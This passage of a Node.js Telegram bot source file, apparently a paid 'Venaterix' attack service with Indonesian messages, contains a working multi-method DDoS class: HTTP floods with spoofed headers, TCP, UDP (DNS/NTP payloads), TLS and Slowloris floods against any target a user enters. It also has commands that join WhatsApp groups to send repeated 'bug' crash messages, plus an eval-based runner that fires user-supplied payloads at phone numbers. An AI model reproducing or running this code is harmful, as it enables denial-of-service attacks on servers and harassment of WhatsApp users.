            target,
            port,
            threads,
            duration,
            method,
            chatId: msg.chat.id,
            messageId: attackMessage.message_id
        });

        attackController.start();

        global.currentAttack = global.currentAttack || {};
        global.currentAttack[msg.chat.id] = attackController;

        const stopHandler = async (callbackQuery) => {
            if (callbackQuery.data === `stop_${msg.chat.id}` && global.currentAttack[msg.chat.id]) {
                global.currentAttack[msg.chat.id].stop();
                await bot.answerCallbackQuery(callbackQuery.id, { text: "Attack stopped!" });
            }
        };

        bot.on('callback_query', stopHandler);

        setTimeout(() => {
            bot.removeListener('callback_query', stopHandler);
            if (global.currentAttack[msg.chat.id]) {
                delete global.currentAttack[msg.chat.id];
            }
        }, (duration + 10) * 1000);

    } catch (error) {
        console.error("Attack error:", error);
        await bot.editMessageText(`❌ Attack failed: ${error.message}`, {
            chat_id: msg.chat.id,
            message_id: attackMessage.message_id
        });
    }
});

class RealDDoSAttack {
    constructor(config) {
        this.config = config;
        this.stats = {
            packetsSent: 0,
            bytesSent: 0,
            connections: 0,
            errors: 0,
            startTime: Date.now()
        };
        this.isAttacking = false;
        this.workers = [];
        this.updateInterval = null;
        this.sockets = new Set();
    }

    async start() {
        this.isAttacking = true;
        this.stats.startTime = Date.now();
        
        this.updateInterval = setInterval(() => this.updateStats(), 2000);
        
        switch(this.config.method) {
            case 'HTTP':
                this.launchHTTPFlood();
                break;
            case 'TCP':
                this.launchTCPFlood();
                break;
            case 'UDP':
                this.launchUDPFlood();
                break;
            case 'SSL':
                this.launchSSLFlood();
                break;
            case 'SLOW':
                this.launchSlowloris();
                break;
            case 'MIXED':
                this.launchMixedAttack();
                break;
        }

        setTimeout(() => {
            if (this.isAttacking) {
                this.stop();
                this.sendFinalReport();
            }
        }, this.config.duration * 1000);
    }

    launchHTTPFlood() {
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15'
        ];

        const paths = [
            '/', '/index.html', '/api/v1/test', '/wp-admin', '/admin', '/login',
            '/api', '/test', '/debug', '/status', '/health', '/metrics'
        ];

        for (let i = 0; i < this.config.threads; i++) {
            const worker = setInterval(async () => {
                if (!this.isAttacking) return;

                const options = {
                    hostname: this.config.target,
                    port: this.config.port,
                    path: paths[Math.floor(Math.random() * paths.length)],
                    method: 'GET',
                    headers: {
                        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1',
                        'Cache-Control': 'max-age=0',
                        'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
                    },
                    timeout: 5000
                };

                const req = http.request(options, (res) => {
                    this.stats.packetsSent++;
                    this.stats.bytesSent += 512;
                    
                    res.on('data', (chunk) => {
                        this.stats.bytesSent += chunk.length;
                    });
                    
                    res.on('end', () => {
                        this.stats.connections++;
                    });
                });

                req.on('error', (err) => {
                    this.stats.errors++;
                });

                req.end();
            }, 10);

            this.workers.push(worker);
        }
    }

    launchTCPFlood() {
        const payloads = [
            Buffer.from('GET / HTTP/1.1\r\n\r\n'),
            Buffer.from('POST / HTTP/1.1\r\n\r\n'),
            Buffer.from('HEAD / HTTP/1.1\r\n\r\n'),
            Buffer.from('OPTIONS / HTTP/1.1\r\n\r\n'),
            Buffer.alloc(1024, 'X') // Random data
        ];

        for (let i = 0; i < this.config.threads; i++) {
            const worker = setInterval(() => {
                if (!this.isAttacking) return;

                const socket = new net.Socket();
                this.sockets.add(socket);

                socket.connect(this.config.port, this.config.target, () => {
                    for (let j = 0; j < 10; j++) {
                        const payload = payloads[Math.floor(Math.random() * payloads.length)];
                        socket.write(payload);
                        this.stats.packetsSent++;
                        this.stats.bytesSent += payload.length;
                    }
                    socket.end();
                });

                socket.on('error', (err) => {
                    this.stats.errors++;
                    this.sockets.delete(socket);
                });

                socket.on('close', () => {
                    this.sockets.delete(socket);
                    this.stats.connections++;
                });

                socket.setTimeout(3000, () => {
                    socket.destroy();
                    this.sockets.delete(socket);
                });
            }, 50);

            this.workers.push(worker);
        }
    }

    launchUDPFlood() {
        const dnsQuery = Buffer.from([
            0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x03, 0x77, 0x77, 0x77,
            0x06, 0x67, 0x6f, 0x6f, 0x67, 0x6c, 0x65, 0x03,
            0x63, 0x6f, 0x6d, 0x00, 0x00, 0x01, 0x00, 0x01
        ]);

        const ntpPayload = Buffer.from([
            0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        ]);

        for (let i = 0; i < this.config.threads; i++) {
            const worker = setInterval(() => {
                if (!this.isAttacking) return;

                const socket = dgram.createSocket('udp4');
                const payload = Math.random() > 0.5 ? dnsQuery : ntpPayload;

                socket.send(payload, this.config.port, this.config.target, (err) => {
                    if (!err) {
                        this.stats.packetsSent++;
                        this.stats.bytesSent += payload.length;
                    } else {
                        this.stats.errors++;
                    }
                    socket.close();
                });

                socket.on('error', (err) => {
                    this.stats.errors++;
                });
            }, 1);

            this.workers.push(worker);
        }
    }

    launchSSLFlood() {
        for (let i = 0; i < this.config.threads; i++) {
            const worker = setInterval(() => {
                if (!this.isAttacking) return;

                const socket = tls.connect({
                    host: this.config.target,
                    port: this.config.port,
                    rejectUnauthorized: false,
                    secureProtocol: 'TLS_method',
                    ciphers: 'ALL'
                }, () => {
                    this.stats.packetsSent++;
                    this.stats.connections++;
                    
                    // Send garbage data
                    const garbage = Buffer.alloc(1024);
                    socket.write(garbage);
                    this.stats.bytesSent += garbage.length;
                    
                    socket.end();
                });

                socket.on('error', (err) => {
                    this.stats.errors++;
                });

                socket.setTimeout(5000, () => {
                    socket.destroy();
                });

                this.sockets.add(socket);
                socket.on('close', () => this.sockets.delete(socket));
            }, 100);

            this.workers.push(worker);
        }
    }

    launchSlowloris() {
        const connections = [];
        
        for (let i = 0; i < Math.min(this.config.threads, 200); i++) {
            setTimeout(() => {
                const socket = new net.Socket();
                connections.push(socket);
                
                socket.connect(this.config.port, this.config.target, () => {
                    socket.write(`GET /${Math.random()} HTTP/1.1\r\n`);
                    socket.write(`Host: ${this.config.target}\r\n`);
                    socket.write('User-Agent: Mozilla/5.0\r\n');
                    socket.write('Accept-Language: en-US,en;q=0.9\r\n');
                    
                    this.stats.connections++;
                    this.sockets.add(socket);
                });

                const keepAlive = setInterval(() => {
                    if (socket && !socket.destroyed) {
                        socket.write(`X-${Math.random()}: ${Math.random()}\r\n`);
                        this.stats.packetsSent++;
                    } else {
                        clearInterval(keepAlive);
                    }
                }, 15000);

                socket.on('error', (err) => {
                    clearInterval(keepAlive);
                    this.stats.errors++;
                    this.sockets.delete(socket);
                });

                this.workers.push(keepAlive);
            }, i * 100);
        }
    }

    launchMixedAttack() {
        this.launchHTTPFlood();
        setTimeout(() => this.launchTCPFlood(), 1000);
        setTimeout(() => this.launchUDPFlood(), 2000);
        setTimeout(() => this.launchSSLFlood(), 3000);
    }

    async updateStats() {
        if (!this.isAttacking) return;

        const timeElapsed = Math.floor((Date.now() - this.stats.startTime) / 1000);
        const timeLeft = Math.max(0, this.config.duration - timeElapsed);
        
        const rps = timeElapsed > 0 ? Math.floor(this.stats.packetsSent / timeElapsed) : 0;
        const bandwidthMB = (this.stats.bytesSent / 1024 / 1024).toFixed(2);
        const successRate = this.stats.packetsSent > 0 
            ? Math.floor((this.stats.packetsSent - this.stats.errors) / this.stats.packetsSent * 100)
            : 0;

        const statusText = `
⚠️ <b>PROSES DDOS ATTACK IN PROGRESS</b> ⚠️
━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${this.config.target}:${this.config.port}</code>
🔧 <b>Method:</b> ${this.config.method}
⚡ <b>Threads:</b> ${this.config.threads}
⏱️ <b>Duration:</b> ${this.config.duration}s
━━━━━━━━━━━━━━━━━━━━━━━
<b>📊 REAL-TIME STATS:</b>

<b>📦 Packets Sent:</b> ${this.stats.packetsSent.toLocaleString()}
<b>🚀 Rate:</b> ${rps.toLocaleString()}/s
<b>📡 Bandwidth:</b> ${bandwidthMB} MB
<b>🔗 Connections:</b> ${this.stats.connections.toLocaleString()}
<b>❌ Errors:</b> ${this.stats.errors.toLocaleString()}
<b>✅ Success Rate:</b> ${successRate}%
<b>⏳ Time Left:</b> ${timeLeft}s
━━━━━━━━━━━━━━━━━━━━━━━
<b>Status:</b> ${this.isAttacking ? '🟢 ATTACKING' : '🔴 STOPPED'}
        `;

        try {
            await bot.editMessageText(statusText, {
                chat_id: this.config.chatId,
                message_id: this.config.messageId,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [[
                        { text: "🔴 STOP ATTACK", callback_data: `stop_${this.config.chatId}` }
                    ]]
                }
            });
        } catch (error) {
            console.log("Update error:", error.message);
        }
    }

    async sendFinalReport() {
        const totalTime = Math.floor((Date.now() - this.stats.startTime) / 1000);
        const avgRPS = totalTime > 0 ? Math.floor(this.stats.packetsSent / totalTime) : 0;
        const totalBandwidthGB = (this.stats.bytesSent / 1024 / 1024 / 1024).toFixed(3);
        
        const reportText = `
🎌 <b>ATTACK COMPLETED - RESULT DDOS</b>
━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${this.config.target}:${this.config.port}</code>
🔧 <b>Method:</b> ${this.config.method}
⏱️ <b>Total Time:</b> ${totalTime}s
━━━━━━━━━━━━━━━━━━━━━━━
<b>📊 FINAL STATISTICS:</b>

<b>📦 Total Packets:</b> ${this.stats.packetsSent.toLocaleString()}
<b>🚀 Average RPS:</b> ${avgRPS.toLocaleString()}/s
<b>📡 Total Bandwidth:</b> ${totalBandwidthGB} GB
<b>🔗 Connections Made:</b> ${this.stats.connections.toLocaleString()}
<b>❌ Total Errors:</b> ${this.stats.errors.toLocaleString()}
<b>⚡ Attack Intensity:</b> ${avgRPS > 1000 ? 'EXTREME ⚡' : avgRPS > 500 ? 'HIGH 🔥' : 'MEDIUM ⚡'}
━━━━━━━━━━━━━━━━━━━━━━━
<b>Status:</b> 🔴 ATTACK COMPLETED
        `;

        try {
            await bot.editMessageText(reportText, {
                chat_id: this.config.chatId,
                message_id: this.config.messageId,
                parse_mode: "HTML"
            });
        } catch (error) {
            console.log("Final report error:", error.message);
        }
    }

    stop() {
        this.isAttacking = false;
        
        this.workers.forEach(clearInterval);
        this.workers = [];
        
        this.sockets.forEach(socket => {
            try {
                socket.destroy();
            } catch (e) {}
        });
        this.sockets.clear();
        
        if (this.updateInterval) {
            clearInterval(this.updateInterval);
        }
        
        this.updateStats();
    }
}

function isValidTarget(target) {
    const ipPattern = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
    
    const domainPattern = /^(?!:\/\/)(?=.{1,255}$)(?!.*\.\.)(?!.*\.$)(?!.*-$)(?!^-)[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z]{2,})+$/;
    
    return ipPattern.test(target) || domainPattern.test(target);
}

bot.onText(/\/stopattack/, (msg) => {
    if (global.currentAttack && global.currentAttack[msg.chat.id]) {
        global.currentAttack[msg.chat.id].stop();
        bot.sendMessage(msg.chat.id, "✅ Attack stopped!");
        delete global.currentAttack[msg.chat.id];
    } else {
        bot.sendMessage(msg.chat.id, "❌ No active attack found.");
    }
});

bot.onText(/\/attackstatus/, (msg) => {
    if (global.currentAttack && global.currentAttack[msg.chat.id]) {
        global.currentAttack[msg.chat.id].updateStats();
    } else {
        bot.sendMessage(msg.chat.id, "❌ No active attack running.");
    }
});
bot.onText(/\/Group(?:\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  const randomImage = getRandomImage();
  const userId = senderId;
  const cooldown = checkCooldown(userId);
  const delay = ms => new Promise(res => setTimeout(res, ms));
  
  
  if (sessions.size === 0) {
    return bot.sendMessage(
      chatId,
      "𝙂𝙖𝙙𝙖 𝙎𝙚𝗻𝗱𝗲𝗿 𝗕𝗮𝗻𝗴 𝗔𝗱𝗱 𝘀𝗲𝗻𝗱𝗲𝗿 𝗱𝘂𝗹𝘂 /connect 𝗟𝗮𝗶𝗻 𝗞𝗮𝗹𝗶 𝗝𝗮𝗻𝗴𝗮𝗻 𝗚𝗯𝗹𝗸‼️"
    );
  }
  
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`🦋Venaterix Invictus\`\`\`
𝗦𝗼𝗸𝗲𝗻𝗮𝗹 𝗟𝘂 𝗧𝗼𝗹𝗼𝗹 🤮`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📞 вυу α¢¢ѕєѕ", url: "https://t.me/VinxzGanteng", style : "success" }]
        ]
      }
    });
  }
  
  if (cooldown > 0) {
    return bot.sendMessage(chatId, 
      `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
  const groupLink = match[1]?.trim();
  if (!groupLink) {
    return bot.sendMessage(
      chatId,
      "🚫 Masukin link grup yang bener!\nContoh: /Group https://chat.whatsapp.com/xxxx"
    );
  }
  
  const codeMatch = groupLink.match(/^https:\/\/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
  if (!codeMatch) {
    return bot.sendMessage(
      chatId,
      "🚫 Link grup salah!\nContoh: /Group https://chat.whatsapp.com/xxxx"
    );
  }
  
  const groupCode = codeMatch[1];
  
  
  try {
    await bot.sendMessage(chatId, "⏳ Sedang join grup, tunggu bentar..."); 
    
    let groupJid;
    try {
      const firstSession = sessions.values().next().value;
      if (!firstSession) {
        return bot.sendMessage(chatId, "❌ Tidak ada koneksi WhatsApp yang aktif");
      }
      
      groupJid = await firstSession.groupAcceptInvite(groupCode);
    } catch (err) {
      return bot.sendMessage(chatId, "❌ Gagal join grup: " + err.message);
    }
    
    await bot.sendMessage(
      chatId,
      "(🤖) Berhasil join grup! Kirim bug sekarang..."
    );
    
    const target = groupJid;
    
    const sentPhoto = await bot.sendAnimation(chatId, 'https://files.catbox.moe/0ik9wn.mp4', {
      caption: `\`\`\`
🌹- Venaterix Invictus
𖣠 Target Group : ${groupLink}
𖣠 Proses : 𝘱𝘳𝘰𝘴𝘦𝘴 𝘣𝘶𝘨....
༒︎ 𝙑𝙀𝙉𝘼𝙏𝙀𝙍𝙄𝙓 𝗔𝗧𝗧𝗔𝗖𝗞
Case by ©otax
\`\`\``,
      parse_mode: 'Markdown'
    });
    
    const photoMsgId = sentPhoto.message_id || (sentPhoto.result && sentPhoto.result.message_id);
    const frames = [
      '▰▱▱▱▱▱▱▱▱▱ 10%',
      '▰▰▱▱▱▱▱▱▱▱ 20%',
      '▰▰▰▱▱▱▱▱▱▱ 30%',
      '▰▰▰▰▱▱▱▱▱▱ 40%',
      '▰▰▰▰▰▱▱▱▱▱ 50%',
      '▰▰▰▰▰▰▱▱▱▱ 60%',
      '▰▰▰▰▰▰▰▱▱▱ 70%',
      '▰▰▰▰▰▰▰▰▱▱ 80%',
      '▰▰▰▰▰▰▰▰▰▱ 90%',
      '▰▰▰▰▰▰▰▰▰▰ 100%'
    ];
    
    const texts = [
      '𖡹 Venaterix?',   
      '𖡹 Venaterix Invictus',
      '𖡹 Venaterix Invictus Attack',
      '𖡹 Venaterix Otw Attack Group',
      '𖡹 Lagi Di Jalan Euyy',
      '𖡹 Nungguin Yakk? ',
      '𖡹 Venaterix Kill You Proses.... ',
      '𖡹 Venaterix Attack Proses....',
      '𖡹 VENATERIX ATTACK IN GROUP!!!!',
      '(🤖) VENATERIX KILL GROUP!!'
    ];
    
    for (let i = 0; i < frames.length; i++) {
      const loadingText = `
\`\`\`
🌹- Venaterix Invictus
𖣠 Target Group : ${groupLink}
${frames[i]}
 ${texts[i]}
༒︎ 𝙑𝙀𝙉𝘼𝙏𝙀𝙍𝙄𝙓 𝗔𝗧𝗧𝗔𝗖𝗞
Case by ©otax
\`\`\`
      `;
      
      await bot.editMessageCaption(loadingText, {
        chat_id: chatId,
        message_id: photoMsgId,
        parse_mode: "Markdown"
      });
      await delay(400);
    }
    
    await bot.editMessageCaption(`
\`\`\`
🌹- Venaterix Invictus 
𖣠 Target Group : ${groupLink}
𖣠 Proses : 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨 
\`\`\`
`, {
      chat_id: chatId,
      message_id: photoMsgId,
      parse_mode: "Markdown"
    });
    
    const sleep = ms => new Promise(res => setTimeout(res, ms));
    
    // Kirim bug ke grup
    for (let i = 0; i <= 200; i++) { 
      await ZxD(target);
      try {
        const firstSession = sessions.values().next().value;
        if (firstSession) {
          // Contoh: await combo(target);
        }
      } catch (err) {
        console.error("Error sending bug:", err);
      }
      await sleep(1000);
    }
    
    await bot.editMessageCaption(`
\`\`\`
🌹- Venaterix Invictus 
♛ Target Group : ${groupLink}
♛ Proses : ${new Date().toLocaleString()}
༒︎ 𝙑𝙀𝙉𝘼𝙏𝙀𝙍𝙄𝙓 𝗔𝗧𝗧𝗔𝗖𝗞
Case by ©otax
\`\`\`
`, {
      chat_id: chatId,
      message_id: photoMsgId,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${groupCode}` }]]
      }
    });
    
  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});
bot.onText(/\/testfunc(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    
    if (!isOwner(senderId)) {
        const randomImage = getRandomImage();
        return bot.sendPhoto(chatId, randomImage, {
            caption: '[ #!. ] Only for owners',
            parse_mode: 'Markdown'
        });
    }

    if (sessions.size === 0) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: '[ 🤖 ] No WhatsApp connection. Use /connect first.',
            parse_mode: 'Markdown'
        });
    }

    if (!msg.reply_to_message) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `[ 🤖 ] Please reply to a message containing a *JavaScript function*\n\nExample:\nreply -> async function test(bot, target, ctx){...}\n/testfunc 628xxxx,1`,
            parse_mode: 'Markdown'
        });
    }

    const args = match[1]?.trim() || '';
    if (!args) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `⁉️ Missing format.\n\nExample:\n/testfunc 628xxxx,5`,
            parse_mode: 'Markdown'
        });
    }

    let [rawTarget, rawLoop] = args.split(',');
    const number = (rawTarget || '').replace(/[^0-9]/g, '');

    if (!number) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: '[ 🤖 ] Invalid target number',
            parse_mode: 'Markdown'
        });
    }

    if (number.length < 10) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: '[ 🤖 ] Invalid phone number format',
            parse_mode: 'Markdown'
        });
    }

    const loop = Math.min(Number(rawLoop) || 1, 100);
    const target = `${number}@s.whatsapp.net`;

    const funcCode = msg.reply_to_message.text || msg.reply_to_message.caption || '';

    let fn;
    try {
        let cleanCode = funcCode
            .replace(/```(javascript|js)?\n?/gi, '')
            .replace(/```/g, '')                     
            .replace(/^[\s\u200B]+|[\s\u200B]+$/g, '');
        
        if (cleanCode.startsWith('async function') || cleanCode.startsWith('function')) {
            fn = eval(`(${cleanCode})`);
        } 
        else if (cleanCode.includes('=>')) {
            if (cleanCode.startsWith('async')) {
                fn = eval(`(${cleanCode})`);
            } else {
                const matchArrow = cleanCode.match(/^(.*?)=>(.*)$/);
                if (matchArrow) {
                    const params = matchArrow[1].trim().replace(/[()]/g, '');
                    const body = matchArrow[2].trim();
                    fn = eval(`(async function(${params}) { return ${body} })`);
                } else {
                    throw new Error('Invalid arrow function syntax');
                }
            }
        }
        else {
            const functionBody = cleanCode.includes('await') ? 
                `async function(bot, target, ctx) { ${cleanCode} }` :
                `function(bot, target, ctx) { ${cleanCode} }`;
            
            fn = eval(`(${functionBody})`);
        }
        
        if (typeof fn !== 'function') {
            throw new Error('Code does not evaluate to a function');
        }
        
    } catch (e) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `[ $ ] Parse error:\n\`${e.message}\`\n\nCode received:\n\`\`\`\n${funcCode.substring(0, 200)}...\n\`\`\``,
            parse_mode: 'Markdown'
        });
    }

    const sock = sessions.values().next().value;
    if (!sock) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: '[ 🤖 ] WhatsApp socket not available',
            parse_mode: 'Markdown'
        });
    }

    const sentAnimation = await bot.sendAnimation(chatId, 'https://files.catbox.moe/0ik9wn.mp4', {
        caption: `\`\`\`
🌹- Venaterix Tes Function
♛ ターゲット : ${number}
♛ ループ : ${loop}x
♛ 状態 : 𝘗𝘳𝘦𝘱𝘢𝘳𝘪𝘯𝘨 𝘍𝘶𝘯𝘤𝘵𝘪𝘰𝘯...
༒︎ •၊၊||၊|။||||।‌‌‌‌‌၊|• 𝗩𝗘𝗡𝗔𝗧𝗘𝗥𝗜𝗫
\`\`\``,
        parse_mode: 'Markdown'
    });

    const animMsgId = sentAnimation.message_id;

    const frames = [
        '▰▱▱▱▱▱▱▱▱▱ 10%',
        '▰▰▱▱▱▱▱▱▱▱ 20%',
        '▰▰▰▱▱▱▱▱▱▱ 30%',
        '▰▰▰▰▱▱▱▱▱▱ 40%',
        '▰▰▰▰▰▱▱▱▱▱ 50%',
        '▰▰▰▰▰▰▱▱▱▱ 60%',
        '▰▰▰▰▰▰▰▱▱▱ 70%',
        '▰▰▰▰▰▰▰▰▱▱ 80%',
        '▰▰▰▰▰▰▰▰▰▱ 90%',
        '▰▰▰▰▰▰▰▰▰▰ 100%'
    ];

    const texts = [
        '🧨 Parsing function...',
        '👻 Loading context...',
        '🔒 Validating parameters...',
        '⚓ Checking WhatsApp connection...',
        '🤬 Executing function...',
        '🧠 Processing iteration...',
        '💣 Function execution in progress',
        '🌀 Sending to target...',
        '💥 Almost done...',
        '(🦋) Execution complete'
    ];

    // Update animation dengan frames
    for (let i = 0; i < frames.length; i++) {
        await bot.editMessageCaption(`\`\`\`
🌹- Venaterix Tes Function
♛ ターゲット : ${number}
${frames[i]}
♛ ${texts[i]}
༒︎ •၊၊||၊|။||||।‌‌‌‌‌၊|• 𝗩𝗘𝗡𝗔𝗧𝗘𝗥𝗜𝗫
\`\`\``, {
            chat_id: chatId,
            message_id: animMsgId,
            parse_mode: 'Markdown'
        });
        
        await new Promise(resolve => setTimeout(resolve, 400));
    }

    let successCount = 0;
    let errorCount = 0;
    const errorLogs = [];
    
    for (let i = 0; i < loop; i++) {
        try {
            const context = {
                sock: sock,
                chatId: chatId,
                target: target,
                number: number,
                
                sendMessage: async (jid, message) => {
                    try {
                        if (typeof sock.sendMessage === 'function') {
                            return await sock.sendMessage(jid, message);
                        } else if (typeof sock.send === 'function') {
                            return await sock.send(jid, message);
                        } else {
                            throw new Error('sendMessage method not found');
                        }
                    } catch (err) {
                        throw err;
                    }
                },
                
                relayMessage: async (jid, message, options = {}) => {
                    try {
                        if (typeof sock.relayMessage === 'function') {
                            return await sock.relayMessage(jid, message, options);
                        } else if (typeof sock.sendMessage === 'function') {
                            return await sock.sendMessage(jid, message);
                        } else {
                            throw new Error('relayMessage method not found');
                        }
                    } catch (err) {
                        throw err;
                    }
                },
                
                sendWhatsAppMessage: async (jid, content) => {
                    return await context.sendMessage(jid, content);
                },
                
                sendText: async (jid, text) => {
                    return await context.sendMessage(jid, { text: text });
                },
                
                sleep: (ms) => new Promise(resolve => setTimeout(resolve, ms)),
                
                telegramBot: bot,
                
                sendTelegramMessage: async (text, opts = {}) => {
                    return bot.sendMessage(chatId, text, opts);
                }
            };
            
            await fn(bot, target, context);
            successCount++;
            
            await bot.editMessageCaption(`\`\`\`
🌹- Venaterix Tes Function
♛ ターゲット : ${number}
♛ ループ : ${i + 1}/${loop}
♛ 成功 : ${successCount}
♛ エラー : ${errorCount}
♛ 状態 : 𝘙𝘶𝘯𝘯𝘪𝘯𝘨...
༒︎ •၊၊||၊|।||||।‌‌‌‌‌၊|• 𝗩𝗘𝗡𝗔𝗧𝗘𝗥𝗜𝗫
\`\`\``, {
                chat_id: chatId,
                message_id: animMsgId,
                parse_mode: 'Markdown'
            });
            
            await context.sleep(500);
        } catch (e) {
            console.log('[TESFUNC ERROR]', e);
            errorCount++;
            errorLogs.push(`Iteration ${i + 1}: ${e.message}`);
            
            if (errorLogs.length <= 3) {
                await bot.sendMessage(chatId, `[!] Error on iteration ${i + 1}: ${e.message}`);
            }
        }
    }

    await bot.editMessageCaption(`\`\`\`
🌹- Venaterix Tes Function
♛ ターゲット : ${number}
♛ 総ループ : ${loop}
♛ 成功 : ${successCount}
♛ エラー : ${errorCount}
♛ タイムタン : ${new Date().toLocaleString()}
༒︎ •၊၊||၊|।||||।‌‌‌‌‌၊|• 𝗩𝗘𝗡𝗔𝗧𝗘𝗥𝗜𝗫
\`\`\``, {
        chat_id: chatId,
        message_id: animMsgId,
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [[
                { text: "Ｃ Ｅ Ｋ 𖤓 Ｔ Ａ Ｒ Ｇ Ｅ Ｔ", url: `https://wa.me/${number}` }
            ]]
        }
    });

    // Error summary
    if (errorLogs.length > 0) {
        let errorSummary = `[!] ${errorCount} errors encountered:\n`;
        if (errorLogs.length > 5) {
            errorSummary += errorLogs.slice(0, 5).join('\n');
            errorSummary += `\n...and ${errorLogs.length - 5} more errors`;
        } else {
            errorSummary += errorLogs.join('\n');
        }
        await bot.sendMessage(chatId, errorSummary);
    }

    await bot.sendMessage(chatId, `[ ! ] Test function execution completed\nSuccess: ${successCount}, Failed: ${errorCount}`);
});
bot.onText(/\/pin/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const replyMsg = msg.reply_to_message;

  // Validasi: harus reply pesan
  if (!replyMsg) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `❌ *Reply pesan yang mau disematkan!*`,
      parse_mode: 'Markdown'
    });
  }

  try {
    await bot.pinChatMessage(chatId, replyMsg.message_id, {
      disable_notification: false
    });

    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
    bot.sendMessage(chatId, 
      `✅ *Pesan berhasil disematkan!*\n\n📌 Oleh: ${username}`,
      { parse_mode: 'Markdown' }
    );

  } catch (error) {
    console.error('Pin Error:', error.message);
    
    let errorMsg = `❌ *Gagal menyematkan pesan!*\n\n`;
    if (error.response?.body?.description) {
      const desc = error.response.body.description;
      if (desc.includes('not enough rights')) {
        errorMsg += `🔴 *Bot bukan admin!*\nPromosikan bot jadi admin dengan hak *Pin Messages*.`;
      } else if (desc.includes('chat not modified')) {
        errorMsg += `ℹ️ Pesan ini sudah disematkan sebelumnya.`;
      } else {
        errorMsg += `⚠️ ${desc}`;
      }
    } else {
      errorMsg += `⚠️ ${error.message}`;
    }

    bot.sendMessage(chatId, errorMsg, { parse_mode: 'Markdown' });
  }
});

/**
 * 🔓 /unpin - Lepas sematan dari pesan yang di-reply
 */
bot.onText(/\/unpin/, async (msg) => {
  const chatId = msg.chat.id;
  const replyMsg = msg.reply_to_message;

  if (!replyMsg) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `❌ *Reply pesan yang mau dilepas sematannya!*`,
      parse_mode: 'Markdown'
    });
  }

  try {
    await bot.unpinChatMessage(chatId, replyMsg.message_id);

    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
    bot.sendMessage(chatId,
      `✅ *Sematan pesan dilepas!*\n\n🔓 Oleh: ${username}`,
      { parse_mode: 'Markdown' }
    );

  } catch (error) {
    console.error('Unpin Error:', error.message);
    
    let errorMsg = `❌ *Gagal melepas sematan!*\n\n`;
    if (error.response?.body?.description) {
      const desc = error.response.body.description;
      if (desc.includes('not enough rights')) {
        errorMsg += `🔴 *Bot bukan admin!*\nBerikan hak *Pin Messages*.`;
      } else if (desc.includes('MESSAGE_ID_INVALID')) {
        errorMsg += `ℹ️ Pesan ini tidak memiliki sematan.`;
      } else {
        errorMsg += `⚠️ ${desc}`;
      }
    } else {
      errorMsg += `⚠️ ${error.message}`;
    }

    bot.sendMessage(chatId, errorMsg, { parse_mode: 'Markdown' });
  }
});

bot.onText(/\/unpinall/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const chatType = msg.chat.type;

  // Hanya untuk grup/supergroup
  if (chatType !== 'group' && chatType !== 'supergroup') {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `❌ Perintah ini hanya untuk grup.`,
